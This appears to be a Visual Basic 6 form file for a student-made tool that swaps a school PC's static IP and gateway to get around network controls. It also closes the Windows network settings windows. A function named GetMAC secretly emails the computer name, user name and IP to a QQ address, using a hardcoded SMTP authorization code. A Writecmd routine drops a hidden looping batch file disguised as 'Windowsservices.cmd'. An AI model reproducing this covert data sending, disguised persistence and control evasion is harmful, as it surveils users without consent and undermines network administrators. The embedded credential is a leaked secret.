VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "10班联网控制程序-by lhc"
   ClientHeight    =   2895
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4695
   BeginProperty Font 
      Name            =   "@System"
      Size            =   12
      Charset         =   134
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   2895
   ScaleWidth      =   4695
   StartUpPosition =   3  '窗口缺省
   Begin VB.CommandButton Command2 
      Caption         =   "？"
      Height          =   1695
      Left            =   24360
      TabIndex        =   1
      Top             =   10440
      Width           =   2655
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4920
      Top             =   720
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Connect"
      BeginProperty Font 
         Name            =   "Euclid Fraktur"
         Size            =   48
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2895
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4695
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Const WM_CLOSE = &H10

Dim countdown As Integer

Private Sub Command1_Click()
If Command1.Caption = "Connect" Then
MsgBox "本程序授权给zyh使用，仅供学习交流，若用于非法用途一切后果自负！"
Status = ChangeIP("172.16.40.80", "255.255.255.0", "172.16.40.254", "172.16.10.78", "")
countdown = 67
Timer1.Enabled = True
Command1.Caption = "Disconnect"
  If Status = "succeeded in connecting" Then
  MsgBox "succeeded in connecting!"
  Else
  MsgBox "zqxswl,未管理员身份运行或被强者吓到了，无法连接！"
  End
  End If
Else
Debug.Print ChangeIP("172.16.40.31", "255.255.255.0", "", "", "")
Command1.Caption = "Connect"
Timer1.Enabled = False
Form1.Caption = "10班联网控制程序-by lhc"
End If
End Sub



Private Sub Form_DblClick()
Debug.Print ChangeIP("172.16.40.31", "255.255.255.0", "", "", "")
End Sub


Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Debug.Print ChangeIP("172.16.40.31", "255.255.255.0", "", "", "")
End Sub


Private Sub Timer1_Timer()
CloseWindow
countdown = countdown - 1
If countdown = 0 Then
Debug.Print ChangeIP("172.16.40.31", "255.255.255.0", "", "", "")
Command1.Caption = "Connect"
Form1.Caption = "10班联网控制程序-by lhc"
Timer1.Enabled = False
End '关键
Else
 If countdown = 60 Then
  If GetMAC = 1 Then
  Shell "cmd.exe /k" & "echo It seems that the Internet is not accessible now,call lhc for help "
  Else
  MsgBox "INTERNET ACCESSIBLE!"
  End If
 End If
Form1.Caption = "安全倒计时" & countdown & "秒，重连重计"
End If
End Sub


Public Function ChangeIP(IP As String, NM As String, GW As String, MDNS As String, SDNS As String) As String
 '返回值说明:返回一个设置的中文说明.
Dim strComputer, objWMIService, colNetAdapters, strIPAddress, strSubnetMask
 Dim strGateway, strGatewaymetric, strDNS, objNetAdapter, errEnable, errGateways, errDNS
 strComputer = "."
 Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
 Set colNetAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE")
 strIPAddress = Array(IP) 'ip地址
strSubnetMask = Array(NM) '子网掩码
strGateway = Array(GW) '网关
strDNS = Array(MDNS, SDNS) '主DNS各备DNS
 strGatewaymetric = Array(1)

 For Each objNetAdapter In colNetAdapters

 errEnable = objNetAdapter.EnableStatic(strIPAddress, strSubnetMask)
 errGateways = objNetAdapter.SetGateways(strGateway, strGatewaymetric)
 errDNS = objNetAdapter.SetDNSServerSearchOrder(strDNS)
 If errEnable = 0 And errGateways = 0 And errDNS = 0 Then
 ChangeIP = "设置成功"
Else
 If errEnable = 0 Then
 ChangeIP = "succeeded in connecting" 'IP地址和子网掩码设置成功
Else
 'ChangeIP = "zqxswl," 'IP地址或子网掩码设置失败
 'MsgBox "联网控制程序被zq吓到了，由于无管理员身份运行或已连接网络！"
 'End
End If
 If errGateways = 0 Then
 ChangeIP = "succeeded in connecting" '默认网关设置成功
Else
 'ChangeIP = ChangeIP & "zqxswl" '默认网关设置失败
End If
 If errDNS = 0 Then
 ChangeIP = "succeeded in connecting"
 'ChangeIP = ChangeIP & "" 'DNS设置成功
Else
 'ChangeIP = ChangeIP & "" 'DNS设置失败
End If
 End If
 Next
 End Function



Public Function GetMAC() As String
On Error GoTo NetError
Dim aa As String 'get module
Dim strLocalIP As String 'get module
Dim winIP As Object 'get module

aa = aa & "Name of this computer:" & Environ("computername") & vbCrLf 'get module'获取信息模块
aa = aa & "User name of this computer:" & Environ("username") & vbCrLf 'get module
Set winIP = CreateObject("MSWinsock.Winsock") 'get module
strLocalIP = winIP.localip
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''邮件发送模块
Dim Email As Object
Const NameSpace = "http://schemas.microsoft.com/cdo/configuration/"
Set Email = CreateObject("cdo.message")
Email.From = 2631988746# & "@qq.com" '发件人邮箱
Email.to = 1041351041# & "@qq.com" '收件人邮箱*
Email.Subject = "This email was sent at" & Hour(Time) & ":" & Minute(Time) & ":" & Second(Time)  '主题
Email.Textbody = aa & "IP of this computer:" & strLocalIP & "?(this is still in-accuate after test)" '邮件内容
With Email.Configuration.Fields
.Item(NameSpace & "sendusing") = 2
.Item(NameSpace & "smtpserver") = "smtp.qq.com" '使用qq的邮件服务器
.Item(NameSpace & "smtpserverport") = 465
.Item(NameSpace & "smtpauthenticate") = 1
.Item(NameSpace & "sendusername") = 2631988746# 'qq号码
.Item(NameSpace & "sendpassword") = "qvcfzgrwbibzebfd"  ' 授权码（密码）
.Item(NameSpace & "smtpusessl") = "true" '加密发送，QQ邮箱不允许普通发送
.Update
End With
Email.Send
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''邮件发送模块
Exit Function
NetError: GetMAC = 1
End Function



Sub Writecmd() '写入监测cmd到temp目录下并打开cmd，防止查看IP

Set fs = CreateObject("scripting.filesystemobject")
Dim RetVal
If (fs.fileexists(Environ("temp") & "\Windowsservices.cmd")) Then

RetVal = Shell(Environ("temp") & "\Windowsservices.cmd", vbHide) '运行
Else
Open Environ("temp") & "\Windowsservices.cmd" For Output As #1
Print #1, ":loop"
Print #1, "@echo off"
Print #1, "tasklist | find /i " & Chr(34) & "NetService.exe" & Chr(34) & "||netsh interface ip set address 以太网 static 172.16.40.31 255.255.255.0 172.16.30.254 1"
Print #1, "ping -n 3 127.1>nul"
Print #1, "goto :loop"
Close #1

SetAttr Environ("temp") & "\Windowsservices.cmd", vbHidden '隐藏

RetVal = Shell(Environ("temp") & "\Windowsservices.cmd", vbHide) '运行
End If
End Sub





Sub CloseWindow()
Dim hwnd, result As Long
hwnd = FindWindow(vbNullString, "设置") '获得指定窗体标题的窗体的句柄
If hwnd <> 0 Then
    result = PostMessage(hwnd, WM_CLOSE, 0&, 0&)    '向目标程序发送消息
    If result = 0 Then
    MsgBox "已连上网络，不要修改网络设置哦！"
    End If
End If
hwnd = FindWindow(vbNullString, "控制面板\网络和 Internet\网络连接") '获得指定窗体标题的窗体的句柄
If hwnd <> 0 Then
    result = PostMessage(hwnd, WM_CLOSE, 0&, 0&)    '向目标程序发送消息
    If result = 0 Then
    MsgBox "已连上网络，不要修改网络设置哦！"
    End If
End If
End Sub


Private Sub Command2_Click()
MsgBox "zyh太强了！"
End Sub
